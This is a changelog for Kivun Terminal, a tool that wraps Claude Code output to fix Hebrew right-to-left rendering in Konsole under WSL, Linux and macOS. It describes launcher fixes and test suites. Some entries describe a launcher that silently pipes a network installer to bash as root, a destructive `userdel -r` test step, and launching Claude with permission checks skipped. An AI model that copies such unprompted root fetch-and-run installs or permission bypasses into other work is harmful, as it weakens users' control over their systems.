- **`payload/kivun-direct.sh` v1.1.15 (defense in depth)**: EUID==0 guard mirroring the one v1.1.14 added to `kivun-launch.sh`. If somehow upstream WSL changes break the .bat detection AND the .bat then routes through the direct fallback, this script still refuses to run Claude as root and prints the fix-instructions.

### Lesson learned (carried into the launcher-bulletproofing memory entry and CLAUDE.md note)

When a launcher fix targets a symptom from a single user report, walk through ALL execution paths that lead to the same symptom — not just the one in the bug report. v1.1.14 fixed the symptom for the Konsole-launch path but missed the direct-fallback path. Both could lead the same user to the same red Claude error. CI tests (`validate-launcher-windows.yml`) only exercise the Konsole-launch path because that's the happy path; the fallback path needs explicit consideration.

Also: cmd's parse-time `%VAR%` expansion inside `if (...) (...)` blocks bites every time. Use flat top-level statements when each step modifies the variable being checked.

## [1.1.14] - 2026-04-27

User-reported real install failure on a machine where `/mnt/wslg/runtime-dir` was owned by `root` (fresh Ubuntu setup, default WSL user is root, or distro from cloud-init). The launcher faithfully detected the WSLg owner and ran as root, the wrapper deployed to `/root/.local/share/kivun-terminal/...`, and Claude Code immediately exited with `--dangerously-skip-permissions cannot be used with root/sudo privileges for security reasons`. From the user's perspective: Kivun opens, prints "Claude exited with code 1", crashes.

### Fixed

- **`payload/kivun-terminal.bat` v1.1.14**: when `WSLG_USER` resolves to `root`, the launcher now queries `wsl -d Ubuntu --user root -- id -un 1000` to find the conventional first non-root user, and uses that for the WSL launch instead of root. If no UID-1000 user exists, the launcher aborts with a clear error message and copy-paste-able instructions for creating one (`adduser`, `usermod -aG sudo`, `ubuntu config --default-user`, `wsl --terminate`).
- **`payload/kivun-launch.sh` v1.1.14 (defense in depth)**: a guard at the top of the WSL-side launcher that refuses to run when `EUID=0`. If somehow the .bat detection is defeated upstream, or someone invokes the bash launcher directly via `wsl --user root -- bash kivun-launch.sh`, this prints the same fix-instructions and exits 1 before reaching Claude.

### Why this didn't surface earlier

Most Kivun users created their Ubuntu via the standard MS Store image, which prompts for a username on first run and creates UID 1000. WSLg ends up owned by that user. The WSLG_USER detection (added v1.1.4) Just Works and the launcher runs as the right user.

The reported case (user `mipmip`) had Ubuntu's default user as root — likely a fresh install that skipped the user-creation prompt, or a custom distro image. There the WSLG_USER detection returned `root`, the launcher dutifully passed `--user root`, and the chain failed with a confusing Claude error message instead of a clear "create a non-root user first."

### Test path (manual, no unit test for Windows .bat / WSL launch)

To reproduce + verify locally:

```cmd
REM 1. Reset to a "no non-root user" state (DESTRUCTIVE - back up first):
REM    wsl -d Ubuntu --user root -- userdel -r yourname
REM    ubuntu config --default-user root
REM 2. Run Kivun. Should now show the v1.1.14 error message with
REM    instructions instead of crashing with the Claude exit-code-1 message.
```

## [1.1.13] - 2026-04-27

> **Status:** USER-CONFIRMED WORKING. Verified against a real Hebrew Claude session on Konsole 23.08.5 (Ubuntu 24.04 LTS, April 27, 2026). The wrapper processes the actual user `dump.bin` cleanly: 55 cursor-forwards replaced + 98 SGR codes stripped, single attribute region per RTL line, English/code runs land at UAX #9 logical positions inside Hebrew sentences.

The actual word-order fix. v1.1.10–v1.1.12 chased the wrong cause. After enabling `KIVUN_BIDI_DUMP_RAW=on` and capturing the byte stream Claude actually emits in TUI mode, the root cause turned out to be cursor-forward CSI escapes — `\x1b[1C` instead of literal space characters between every word. 19 KB of one short Hebrew session contained **306 cursor-forward CSIs**. Konsole's BiDi engine treats each `\x1b[NC` as an attribute-region boundary the same way it treats SGR color changes — exactly the splitter that v1.1.10 FLATTEN_COLORS_RTL was supposed to eliminate, but FLATTEN only stripped CSI sequences ending in `m`.

That's why earlier deep-test fixtures rendered correctly but real Claude output kept misposition: the deep tests used plain `printf` with literal spaces. Claude's TUI does not.

### Added

- **CSI cursor-forward replacement on RTL lines** (extends the existing `KIVUN_BIDI_FLATTEN_COLORS_RTL` flag — same semantics, broader coverage). When the line's first strong char is Hebrew and `KIVUN_BIDI_FLATTEN_COLORS_RTL=on` (default), the wrapper now also intercepts CSI sequences ending in `C` and replaces each `\x1b[NC` with N literal space characters. Visually identical (cursor-forward moves over presumed-blank cells; spaces write to those same cells), but no attribute-region boundary so Konsole sees the entire RTL line as a single BiDi run and positions LTR runs (English/code/numbers) at their correct UAX #9 logical positions.
- **`Injector#cursorForwardReplacedCount` public counter** for tests + diagnostics, in addition to the existing `flattenedSgrCount`.
- **Regression test suite** (`kivun-claude-bidi/test/cursor-forward-rtl.test.js`, 9 tests) covering single + multi-column cursor-forward, default-no-param `\x1b[C`, no-touch on LTR lines, no-touch on other CSI cursor sequences (up/back/etc.), compound with SGR strip on the same line, and a verbatim-Claude-dump-pattern fixture.

### Why three earlier releases didn't catch this

- v1.1.10 (FLATTEN_COLORS_RTL) only handled CSI ending in `m`. It eliminated visible color codes from Hebrew lines but the cursor-forward CSIs Claude uses for inter-word spacing kept splitting BiDi runs.
- v1.1.11 (no per-run RLE/PDF on RTL lines) eliminated the wrapper-emitted attribute boundaries. But Claude's own cursor-forwards remained.
- v1.1.12 (Hebrew prompt formatting hint) tried to fix it by changing what Claude generates. It backfired — the long prompt confused Claude into reordering words. **Reverted: do not use the v1.1.12 prompt change in production. v1.1.13 ships the v1.1.10/v1.1.11 prompt unchanged.** The CHANGELOG keeps the v1.1.12 entry for history but treats that release as withdrawn.
- We needed `DUMP_RAW=on` (added in v1.1.10) plus a real Hebrew session to see the cursor-forward pattern. Without that diagnostic, we'd have kept guessing.

### Lesson learned (carried into the BiDi limits memory entry)

When a wrapper-rendered terminal output looks wrong even though all visible escapes are stripped, look for *invisible* CSI sequences that act as attribute-region boundaries. Cursor-forward (`...C`), cursor-back (`...D`), set/reset mode (`...h`/`...l`) all qualify. The dump-raw side log answers "what bytes are actually on the wire" — anything that looks like normal text in the dump but is actually an escape sequence is a candidate splitter.

## [1.1.12] - 2026-04-27

Hebrew system-prompt formatting hint. v1.1.11 closed the wrapper-side investigation: BiDi rendering is now correct for the bytes Claude actually emits. But Claude's mixed Hebrew/English output sometimes had unusual spacing patterns (`עדכוןsrc/components/Header.tsx` glued, `הזה-endpoint` with the demonstrative on the wrong side via hyphen) that look broken even though the wrapper renders them faithfully. Fix at the source: tell Claude how to format Hebrew/English mixed text via `--append-system-prompt`.

### Changed

- **Hebrew language prompt** (`payload/languages.sh` + `payload/kivun-terminal.bat`) now includes spacing/demonstrative-placement guidance:
  - Always insert a space between Hebrew text and a foreign token (`'הקובץ src/index.ts'`, not `'הקובץsrc/index.ts'`)
  - Place demonstratives like `הזה`, `הזאת`, `האלה` AFTER the foreign noun with a space (`'ה-endpoint הזה'`, not `'הזה-endpoint'`)
  - The `'ה-'` prefix attaches directly to a single foreign noun via hyphen with no space (`'ה-API'`, `'ה-backend'`); other Hebrew words must be space-separated from foreign tokens

The hint applies only when `RESPONSE_LANGUAGE=hebrew` is set in `config.txt`. Other languages and English-only sessions are unaffected.

### Why a prompt-only release

The wrapper itself shipped its full mixed-content fix in v1.1.11 (no per-run RLE/PDF on RTL lines). What was left was source-text quality from Claude — the wrapper preserves bytes faithfully, but if Claude generates `הזה-endpoint` it'll render exactly that, even though it's not idiomatic Hebrew. v1.1.12 nudges Claude toward better source text via the system prompt. Wrapper code unchanged from v1.1.11; this is a payload/config update only.

## [1.1.11] - 2026-04-27

THE actual mixed-content positioning fix. v1.1.10 reduced the problem (no more visible color codes on Hebrew lines) but real Claude output still mispositioned `Claude Code`, `React 19`, numbers, and other LTR runs inside Hebrew sentences. Investigation revealed the wrapper's own RLE/PDF brackets were causing what was left.

### The follow-up A/B test (April 2026 on Konsole 23.08.5)

After v1.1.10 shipped and the user reported residual misposition, ran `Kivun-BiDi-Deep-Test.bat` — three renderings of the same problem strings:

- **TEST A**: plain `printf` (no wrapper involvement at all)
- **TEST B**: RLM at line-start only
- **TEST C**: RLM + ONE RLE/PDF pair around the whole line

**All three rendered the LTR runs at their correct UAX #9 logical positions.** The thing that made v1.1.10 still broken was the wrapper's own habit of bracketing Hebrew runs *individually* — on a line like `אני משתמש ב-Claude Code-בעברית` it emitted `RLM + RLE + "אני משתמש ב-" + PDF + "Claude Code" + RLE + "-בעברית" + PDF`, creating multiple PDF/RLE transitions that Konsole treated as attribute-region boundaries (the same boundary class as SGR color changes that v1.1.10 fixed).

So per-run RLE/PDF brackets were *themselves* the attribute-region splitters that v1.1.10 was fighting. Removing them on RTL lines closes the loop.

### Added

- **`KIVUN_BIDI_BRACKET_RTL_RUNS` config option** (default `off`) — when off, Hebrew runs INSIDE RTL paragraphs no longer get individual RLE/PDF brackets. Line-start RLM + Konsole's native UAX #9 handle direction across the whole single-attribute line. Hebrew runs INSIDE LTR paragraphs (`Hello שלום world`) still get bracketed because the Hebrew is an exception in an LTR flow and *needs* the marker. Set to `on` if you want the legacy v1.1.0–v1.1.10 behavior back for some reason.
- **Regression test suite** (`kivun-claude-bidi/test/no-bracket-rtl-runs.test.js`, 12 tests) covering off/on modes, Hebrew-only lines, the `Claude Code` mid-Hebrew pattern, the `React 19` pattern, numbers + colon inside Hebrew, the legacy bracketing-still-applies-on-LTR-lines case, line-start RLM preservation, multi-line direction switching, and integration with v1.1.8 strip-bullet.

### Changed

- **All four pre-v1.1.11 test files** (`core.test.js`, `extended.test.js`, `strip-bullet.test.js`, `strip-incoming.test.js`, `flatten-colors-rtl.test.js`) now opt into legacy bracketing with `process.env.KIVUN_BIDI_BRACKET_RTL_RUNS = 'on'` at the top of the file. Their fixtures pre-date v1.1.11 and assert the per-run-bracket pattern; the new no-bracket-on-RTL behavior is exercised only by the new test/no-bracket-rtl-runs.test.js suite.
- **`runIsBracketed` instance flag added to Injector** so PDF emission only fires when the matching RLE was emitted. With per-run bracketing off on RTL lines, no RLE is emitted on entry → no PDF on exit.

### Why three releases instead of one

v1.1.9 (strip-incoming) ruled out "Claude is polluting the stream" — the stream is clean. v1.1.10 (flatten-colors) ruled out "ANSI SGR is splitting BiDi runs" — fixing it eliminated colors but not misposition. v1.1.11 (no per-run brackets) caught the actual cause: **the wrapper itself was a stream polluter from Konsole's perspective.** Each layer was needed to isolate the next layer; shipping incrementally let real-user evidence drive each decision rather than guessing all the layers at once.

## [1.1.10] - 2026-04-27

The mixed-content positioning fix we said was "blocked on Konsole 24+" turned out to be possible from the wrapper after all, once we identified the actual root cause. Plus a debug-only diagnostic for future investigation.

### The architectural finding (April 2026 A/B test on Konsole 23.08.5)

User's earlier screenshots showed English/code runs landing at the visual LEFT edge inside Hebrew sentences (e.g., `React 19` in `אנחנו עובדים עם React 19 ו-Next.js 15` ended up at column 1 from the right instead of the logical column 4). v1.1.9 strip-incoming proved Claude's stream wasn't the cause (no upstream bidi controls in real sessions). That left two hypotheses for what Konsole was doing wrong, distinguishable by an A/B test:

1. **Konsole's BiDi is broken across the line** — no wrapper trick can fix this; we'd be stuck waiting for newer Konsole.
2. **Konsole's BiDi is broken at color/SGR boundaries** — the wrapper can fix this by stripping SGR escapes from RTL lines so the whole line is a single attribute run.

The test (run via `Kivun-BiDi-Color-Test.bat`, available on request): same Hebrew/English mixed text rendered (a) plain — no SGR escapes — and (b) with Claude-style syntax-color SGR around the English runs. **The plain version positioned LTR runs correctly; the colored version misplaced them to the visual left.** Hypothesis #2 confirmed.

This matches what the freedesktop.org Terminal Working Group documented for Konsole upstream:

> "Applies BiDi on continuous runs of identical attributes. Any change in e.g. color (or even highlight with the mouse, or the cursor being positioned inside) stops and starts it anew, often resulting in a confusing and incorrect visual behavior." — [terminal-wg.pages.freedesktop.org/bidi/prior-work/terminals.html](https://terminal-wg.pages.freedesktop.org/bidi/prior-work/terminals.html)

So Konsole has no real BiDi engine; it just hands continuous-attribute regions to Qt's text layout, and Qt has no idea where a colored fragment logically belongs in the surrounding RTL paragraph. This is **not** a "newer Konsole fixes it" problem — it's architectural and KDE has shown no signs of changing it. Earlier docs/changelog notes saying "wait for Konsole 24.04+" were a wrong guess on my part.

### Added

- **`KIVUN_BIDI_FLATTEN_COLORS_RTL` config option** (default `on`) — strips ANSI SGR sequences (CSI sequences ending in `m`) from any line whose first strong char is Hebrew. Result: the whole RTL line is a single attribute run, Konsole's BiDi gets a clean line to work with, and LTR runs (English, code paths, numbers) land at their correct UAX #9 logical positions. Cursor positioning, screen clear, OSC window-title, and other non-SGR CSI sequences pass through unchanged. LTR lines are never touched. Trade-off: visible loss of syntax color on Hebrew lines. Most Hebrew-focused users prefer correct positioning over color; set this to `off` if your workflow is mostly English code and you want color back at the cost of broken positioning when Hebrew appears.
- **`KIVUN_BIDI_DUMP_RAW` config option** (default `off`) — debug-only counterpart to v1.1.9 strip-incoming. When `on`, every chunk Claude sends gets appended to `~/.local/state/kivun-terminal/bidi-raw-dump.bin` BEFORE strip-incoming/flatten-colors processing runs. Per-session `=== session start TIMESTAMP ===` and `=== session end TIMESTAMP ===` markers delineate runs. File auto-rotates to `.bin.old` when its size crosses 5 MiB at session start (bounds total disk use to ~10 MiB regardless of how long it's left on). Useful for diagnosing future render bugs where you need raw byte context, not just the strip log's count.
- **`KIVUN_BIDI_DUMP_RAW_FILE` env override** — points the dump at an alternate path. Used by the regression test suite to keep dumps off the user's real `~/.local/state` directory.
- **Regression test suite for flatten-colors** (`kivun-claude-bidi/test/flatten-colors-rtl.test.js`, 12 tests) covering on/off modes, single + multi-param SGR, mid-Hebrew SGR (the "color one word" pattern), the "React 19" inline-English-in-Hebrew pattern, no-touch on LTR lines, no-touch on non-SGR CSI (cursor/clear), no-touch on OSC, chunk-boundary-mid-CSI handling, multi-line direction switching, and integration with v1.1.8 strip-bullet.
- **Regression test suite for dump-raw** (`kivun-claude-bidi/test/dump-raw.test.js`, 7 tests) covering off/on modes, verbatim pre-strip byte capture, session marker placement, multi-chunk arrival order, the 5 MiB rotation guard, and the no-rotate-below-threshold case.

### Changed

- **Pre-existing tests in `core.test.js`, `extended.test.js`, and `strip-bullet.test.js` opt out of FLATTEN_COLORS_RTL** by setting `process.env.KIVUN_BIDI_FLATTEN_COLORS_RTL = 'off'` at the top of each file. Those tests pre-date v1.1.10 and assert the legacy SGR-passthrough behavior; the new on-by-default behavior is exercised in the new flatten-colors-rtl.test.js suite.
- **`_stepAfterLineStart` restructured to buffer-and-decide for CSI sequences** instead of byte-by-byte passthrough. Required so SGR sequences can be dropped as a unit (we don't know it's SGR until the final byte; without buffering we'd already have emitted ESC + [ + params before knowing).

### Updated honest framing

Earlier v1.1.8 and v1.1.9 changelog entries described the mixed-content positioning issue as "pending Konsole 24.04+ from a future Ubuntu LTS." That framing was incorrect — the bug is architectural in Konsole and the fix needed to be wrapper-side. v1.1.10 ships that fix.

### Inspection cookbook for KIVUN_BIDI_DUMP_RAW

Once `KIVUN_BIDI_DUMP_RAW=on` and a Kivun session has run, useful one-liners (in WSL):

```bash
# Full dump in a pager that handles ANSI escapes:
less -R ~/.local/state/kivun-terminal/bidi-raw-dump.bin

# Just the bidi control chars and 20 chars of context on each side:
grep -aPo '.{0,20}[\x{202A}-\x{202E}\x{2066}-\x{2069}].{0,20}' \
    ~/.local/state/kivun-terminal/bidi-raw-dump.bin

# Hex view (RLE = e2 80 ab, PDF = e2 80 ac, etc.):
xxd ~/.local/state/kivun-terminal/bidi-raw-dump.bin | head -40

# Stream size per session (look for the markers):
grep -c '=== session ' ~/.local/state/kivun-terminal/bidi-raw-dump.bin
```

## [1.1.9] - 2026-04-27

Defensive guardrail with built-in measurement: the wrapper now strips explicit Unicode directional controls from Claude's upstream stream so the wrapper is the only source of directionality information reaching Konsole. Default mode is `auto` — strip silently, but log the first detection per session to a side file so we can tell whether stream pollution is actually happening in real installs (vs. all rendering bugs being Konsole's fault).

### Added

- **`KIVUN_BIDI_STRIP_INCOMING` config option** (default `auto`) — strips embedding controls (`U+202A` LRE, `U+202B` RLE, `U+202C` PDF, `U+202D` LRO, `U+202E` RLO) and isolate controls (`U+2066` LRI, `U+2067` RLI, `U+2068` FSI, `U+2069` PDI) from Claude's stream before the wrapper processes it. Preserves `U+200E` LRM and `U+200F` RLM since the wrapper itself injects RLM at line-start. Modes:
  - `off` — passthrough; controls reach the terminal as-is
  - `auto` — strip + count + log a single line on first detection (default)
  - `on` — strip + count + log every chunk where stripping happened (verbose; useful when investigating a specific render bug)
- **Side diagnostic log at `~/.local/state/kivun-terminal/bidi-strip.log`** — overridable via `KIVUN_BIDI_LOG_FILE`, follows XDG state-dir convention. Lets us answer "is Claude actually polluting the stream?" from real-user installs without a packet capture. Silent by default — only writes when something is actually stripped.
- **Regression test suite** (`kivun-claude-bidi/test/strip-incoming.test.js`, 12 tests) covering all three modes, every char in both stripped ranges, LRM/RLM preservation, cumulative cross-chunk counting, log-write semantics, and non-interference with the v1.1.8 strip-bullet pipeline.

### Why this is `auto` not `on` by default

If most observed Claude output contains zero directional controls, the strip is a no-op in practice — the value of leaving it on is the side log. The framing here is "guardrail with measurement, not a fix": before adding more wrapper heuristics for mixed-content positioning, we want evidence about whether the upstream stream is even contributing to the problem. After a few weeks of real-world use, the log file content tells us either "yes, refine the wrapper" or "no, blame Konsole and stop tweaking the wrapper."

### Closed without merging

- **PR #47 — `experiment/rli-pdi-isolates`** (RLI/PDI isolate wrapping for mixed-content LTR-run positioning). Hypothesis was that wrapping Claude's English/code runs in `U+2067` RLI / `U+2069` PDI would give Konsole's BiDi engine enough hint to position them correctly inside Hebrew paragraphs. User testing on Konsole 23.x showed the isolates regressed the v1.1.8 strip-bullet behavior (Hebrew bullet lines went back to LTR). Conclusion: Konsole 23.x's BiDi engine cannot correctly handle the isolate marks; mixed-content LTR-run positioning remains a known limitation pending Konsole 24.04+ from a future Ubuntu LTS.

## [1.1.8] - 2026-04-26

Workaround for the Konsole 23.x bullet-LTR rendering bug. Hebrew bullet lines from Claude (lines starting with `●`) were rendering with the bullet stuck on the LEFT side of the screen on Ubuntu 24.04 LTS, even though the wrapper correctly injected RLM at line-start. Empirical investigation traced this to Konsole 23.x's BiDi engine classifying the leading `●` as a direction-anchoring neutral and refusing to flip the line RTL.

### Added

- **`KIVUN_BIDI_STRIP_BULLET` config option** (default `on` in v1.1.8) — strips the leading `●` from any line whose first strong char is Hebrew. With no neutral preceding the Hebrew, Konsole's "first non-whitespace char wins" picks Hebrew and renders the line right-aligned. Trade-off: visible `●` disappears on Hebrew bullet lines (indentation stays). English bullet lines unaffected. Set to `off` in `config.txt` if you're on Konsole 24.04+ and want bullets back.
- **Regression test suite** (`kivun-claude-bidi/test/strip-bullet.test.js`, 7 tests) pinning the strip behavior across env values and edge cases.

### Known limitation

Mixed RTL/LTR content positioning on Konsole 23.x doesn't always follow Unicode UAX #9 — LTR runs (English, numbers) inside RTL paragraphs may appear in unexpected visual positions (e.g., `React 19` lands at column 1 from the right instead of column 4). This is a Konsole BiDi engine issue; an experimental `KIVUN_BIDI_USE_ISOLATES=on` option is on the `experiment/rli-pdi-isolates` branch ([PR #47](https://github.com/noambrand/kivun-terminal-wsl/pull/47)) as a possible workaround. Expected to fully resolve when Ubuntu ships Konsole 24.04+ in apt.

## [1.1.7] - 2026-04-26

Two related Konsole/VcXsrv UX fixes plus the bilingual hero and statusline polish that hitchhiked on the cut.

### Fixed

- **Closing the launcher cmd window no longer kills the live Claude session.** Previous launch was `konsole ... &`, which made Konsole a child of the wsl-spawned bash; closing the small cmd.exe launcher window SIGHUP'd Konsole and tore down whatever Claude session was in flight. Konsole is now wrapped in `setsid` so it detaches from the launcher process group and survives the cmd.exe close.

### Added

- **Branded window icon over VcXsrv.** Konsole sets only an empty `_NET_WM_ICON_NAME`, so VcXsrv was falling back to its own X glyph in the taskbar. After the WID is known, `payload/kivun-launch.sh` now invokes the new `payload/kivun-set-icon.py` to write a real `_NET_WM_ICON` via python-xlib (4 sizes 16/32/48/64, ARGB pixels, source PNG background removed via corner floodfill). Best-effort: skips silently if `python3-xlib` / `python3-pil` / the source PNG are missing. The Windows installer (`installer/Kivun_Terminal_Setup.nsi`) now auto-installs `python3-xlib` and `python3-pil` so this path works out of the box.
- **Bilingual He/En README hero** ([PR #38](https://github.com/noambrand/kivun-terminal-wsl/pull/38)) — the top-of-page hero now sells features in both languages instead of just brand.

### Changed

- **Statusline padding bumped to `padding=1`** ([PR #42](https://github.com/noambrand/kivun-terminal-wsl/pull/42)) so the status line breathes a bit more inside Konsole.

## [1.1.6] - 2026-04-26

Active path discovery for `claude`. After absolute slots miss, the launcher and the wrapper now ask the login shell where Claude lives instead of giving up — so users with `nvm`, `pnpm`, `yarn-global`, `snap`, or corporate-managed installs are not forced to set `KIVUN_CLAUDE_BIN`.

### Fixed

- **`bash -lc "command -v claude"` fallback in launcher and wrapper** ([PR #37](https://github.com/noambrand/kivun-terminal-wsl/pull/37)). After v1.1.5 narrowed the presence check to a deterministic absolute-path chain (`~/.local/bin/claude` → `/usr/local/bin/claude` → `/usr/bin/claude`), users with non-standard installs hit a "claude not found" / re-install loop because their actual binary lived under `~/.nvm/...` or `~/.local/share/pnpm/` etc. Both `payload/kivun-terminal.bat` (Windows) and `kivun-claude-bidi/lib/resolve-claude-bin.js` (wrapper resolver) now run `bash -lc "command -v claude"` as a final discovery step before declaring Claude missing.
- **Bash launcher reads `VERSION` dynamically** ([PR #35](https://github.com/noambrand/kivun-terminal-wsl/pull/35)) so the launch log no longer prints a stale `v1.0.6` tag after upgrades.

### Changed

- **`docs/VCXSRV_TROUBLESHOOTING.md`** clarifies that VcXsrv-unreachable is usually fine on modern Windows 11 — WSLg covers the same surface ([PR #36](https://github.com/noambrand/kivun-terminal-wsl/pull/36)).

## [1.1.5] - 2026-04-26

Stop reinstalling Claude on every launch.

### Fixed

- **Presence check no longer triggers a fresh `curl ... | bash` install on every launch** ([PR #34](https://github.com/noambrand/kivun-terminal-wsl/pull/34)). The old check was `bash -c "command -v claude"` — a non-login bash that does not source `~/.profile`, so `~/.local/bin` (where the official `claude.ai/install.sh` curl installer drops the binary) was not on `PATH`. Result: Claude was always reported "missing" and the v1.1.1 auto-install path fired again on every launch. Replaced with an absolute-path `test -x` chain over `~/.local/bin/claude`, `/usr/local/bin/claude`, `/usr/bin/claude`. Same fix applied in the wrapper resolver `kivun-claude-bidi/lib/resolve-claude-bin.js` so the wrapper agrees with the launcher about whether Claude exists.

### Changed

- **Hebrew README polish (multiple iterations).** PRs #18–#33 covered RTL on the Smart App Control note, arrow direction in RTL contexts, the new `docs/HEBREW_RTL_GITHUB.md` contributor guide, flag-image rendering on Windows GitHub, language-pill table layout, Hebrew section parity with English, working LinkedIn badge, and the corrected Claude Desktop comparison.

## [1.1.4] - 2026-04-26

### Fixed

- **Konsole user detection + `:run_direct` claude PATH** ([PR #17](https://github.com/noambrand/kivun-terminal-wsl/pull/17)).

## [1.1.3] - 2026-04-25

### Changed

- **Launcher installs Claude without asking `[Y/N]`** ([PR #16](https://github.com/noambrand/kivun-terminal-wsl/pull/16)). The v1.1.1 auto-install prompt was friction users were always going to answer `Y` to; collapsed to an automatic install with the same loud logging.

## [1.1.2] - 2026-04-25

Maintenance release between v1.1.1 and v1.1.3 (no user-facing PR notes attached to the GitHub release).

## [1.1.1] - 2026-04-25

### Fixed

- **Launcher no longer invokes `claude` after detecting it is missing in WSL.** Prior behavior on a clean WSL install (Claude Code not yet installed inside Ubuntu): the launcher printed `ERROR - Claude Code not found in Ubuntu`, then logged `INFO - Falling back to direct Claude execution in terminal`, then ran the exact same WSL invocation that just failed. The result was `bash: claude: command not found` and a launcher that ended on a crash instead of a help message. The "fallback" was a lie — it went through the same WSL shell that had just reported Claude missing. The presence check in `kivun-terminal.bat` now either leads to a successful auto-install path or a clean exit with real manual instructions; the `:run_direct` block is gated by a new `CLAUDE_IN_WSL` flag and refuses to run when Claude is known-missing.

### Added

- **Optional one-shot Claude Code auto-install inside Ubuntu when missing.** When the WSL presence check fails, the launcher now prints a clear explanation (including "Windows-side Claude Code does NOT work here - Konsole runs in WSL") and prompts the user to install Claude Code inside Ubuntu. On `Y`, it runs the official `curl -fsSL https://claude.ai/install.sh | bash` installer as root (avoiding sudo-TTY hangs), with a `apt-get install nodejs npm + npm install -g @anthropic-ai/claude-code` fallback if the curl installer fails. Matches the installer NSI's existing two-step strategy so behavior is identical whether the user runs the full installer or hits a missing-Claude state on launch.
- **`claude --version` captured to LAUNCH_LOG.txt** after a successful auto-install, so future bug reports include the exact Claude Code version the user has.

### Changed

- **"NOT FOUND" message points at the official `curl` installer, not the deprecated `npm install -g @anthropic-ai/claude-code`.** Per [Anthropic's current docs](https://docs.claude.com/en/docs/claude-code/setup), the npm-global path is deprecated. The installer NSI already uses the curl script primary with npm fallback; the launcher message was out of sync and told users to run the deprecated command. Now consistent.
- **Exit code 2 when Claude is absent and the user declines auto-install.** Previously the launcher would have crashed through `:run_direct` with whatever `claude` returned (typically 127). Now it exits deliberately with a distinguishable code so wrapping scripts can detect this specific state.
- **`docs/TROUBLESHOOTING.md`** "Claude Code: NOT FOUND" section rewritten to document v1.1.1 auto-install behavior and explicitly note that Windows-side Claude Code does not help because Konsole runs inside WSL.

### Known limitations

- The `:run_direct` label is still misleading (it runs Claude inside WSL, not natively on Windows). Keeping the name for v1.1.1 to keep the diff reviewable; rename planned for v1.2.0.

## [1.1.0] - 2026-04-23

### Added

- **BiDi wrapper (`kivun-claude-bidi`).** Wrapper that pipes Claude Code output through a state machine doing two complementary BiDi fixes:
  1. **Bracket every Hebrew run** with Unicode RLE (U+202B) / PDF (U+202C) - forces RTL direction within each run regardless of Konsole profile settings.
  2. **Inject RLM (U+200F) at the start of any line whose first strong char is RTL** - forces the whole line's paragraph direction to RTL, which fixes the Claude Code `● שלום` first-line bug where the bullet prefix would otherwise make Konsole pick LTR paragraph direction.
  Both fixes together mean Hebrew responses render right-aligned from the first line, not just from the second onward. Detection covers Hebrew block (U+0590–U+05FF) and Hebrew presentation forms (U+FB1D–U+FB4F). Lines whose first strong char is Latin (`Hello`, `def foo():`, etc.) get no RLM so English content stays left-aligned.
  - **Default: on.** Ships enabled so Hebrew in Claude Code output works without manual config edits. Disable by setting `KIVUN_BIDI_WRAPPER=off` in `%LOCALAPPDATA%\Kivun-WSL\config.txt` and relaunching.
  - **First enable** runs `npm install --production` inside WSL to build `node-pty` (~5–15 s, one-time). An install stamp (`.kivun-install-stamp`) under `node_modules/` gates subsequent launches to instant startup. Stamp invalidates if the shipped `package.json` is newer.
  - **Deploy target:** `~/.local/share/kivun-terminal/kivun-claude-bidi/` (WSL-native, not `/mnt/c/...`) so `node-pty` builds against real Linux paths and avoids the filesystem-performance / path-translation penalty of `/mnt/c`.
  - **Fallback:** if the key is `on` but the wrapper binary isn't reachable (missing install, failed `npm install`), the launcher logs a loud WARNING and runs unwrapped `claude` so the user never sees a silent launch failure.
  - **Installer packaging:** the `kivun-claude-bidi/` source tree ships under `$INSTDIR\kivun-claude-bidi\` (no `node_modules`; that's built on first enable). Uninstaller removes the tree recursively.
  - **Cross-platform parity (Mac + Linux):** the wrapper now ships in all three installers, not just Windows.
    - **Linux** (`linux/install.sh`): copies the wrapper source to `~/.local/share/kivun-terminal/kivun-claude-bidi/` and runs `npm install --production` once at install time. If npm isn't on PATH yet (Node was just installed in the same run and the user's shell hasn't re-resolved), the launcher's `ensure_wrapper_installed` retries on first launch - same `.kivun-install-stamp` pattern as the WSL launcher. Also fixes a latent bug: the launcher previously set `CLAUDE_EXEC` but the inner launch script invoked `claude` literally, so the wrapper was never actually used on Linux even when configured on.
    - **macOS** (`mac/build.sh` + `mac/scripts/postinstall`): the `.pkg` bundles the wrapper source under `scripts/kivun-claude-bidi/`; postinstall copies it to `/usr/local/share/kivun-terminal/kivun-claude-bidi/` and runs `npm install --production` as the real user (so `node-pty` builds against the correct arch - Intel vs Apple Silicon). The desktop `.command` shortcut now reads `KIVUN_BIDI_WRAPPER` from config and dispatches to the wrapper binary in three branches: default Terminal.app, iTerm2 respawn, and (no-op) WezTerm respawn.
    - Both inline `config.txt` templates (linux installer + mac postinstall) now seed `KIVUN_BIDI_WRAPPER=on`, matching the Windows default.
    - Existing uninstallers already remove the parent share directory, so the wrapper tree is cleaned up without changes to `linux/uninstall.sh` or `mac/uninstall.sh`.
  - **Test coverage:**
    - 18 injector unit fixtures (all passing) covering the HEAVY spec §7 core set (10 ship-blocking: ASCII baseline, pure Hebrew line, mixed-script, multiple runs, Hebrew-space-Hebrew, mid-run ANSI SGR, chunk boundary mid-Hebrew, chunk boundary mid-UTF-8 codepoint, newline inside run, 500-char paragraph) plus 8 extended (Hebrew-comma-Hebrew, Hebrew-period-English, Hebrew-in-parens, chunk mid-CSI, presentation forms, emoji, bracketed-paste, alt-screen toggle).
    - 3 capability-check + 5 terminal-detect tests.
    - End-to-end `test/smoke.sh` spawning the wrapper via node-pty against a fake-claude stand-in and asserting bracket placement in the captured output. 7/7 checks green.
  - **Architecture spec:** `docs/specs/CLAUDE_CODE_TASK_RTL_WRAPPER_HEAVY.md` (RLE/PDF embedding design, edge-case handling, fallback heuristics). Alternatives considered and rejected: RLI/PDI isolates (v2 candidate if we observe direction-leak artifacts), line-start RLM (MEDIUM spec, deferred - `docs/specs/CLAUDE_CODE_TASK_RTL_WRAPPER_MEDIUM_DEFERRED.md` for the decision trail), full xterm.js headless state machine (rejected as over-engineering).
  - **Integration gate status:** §1 of HEAVY requires three `printf` lines in a functioning Konsole to empirically confirm RLE/PDF rendering. Deferred to pre-tag per canary-gated-ship plan; see `docs/research/integration-gate-status.md` for the three acceptable paths and `docs/research/pty-probe-2026-04-23.zip` for the prototype decision trail.
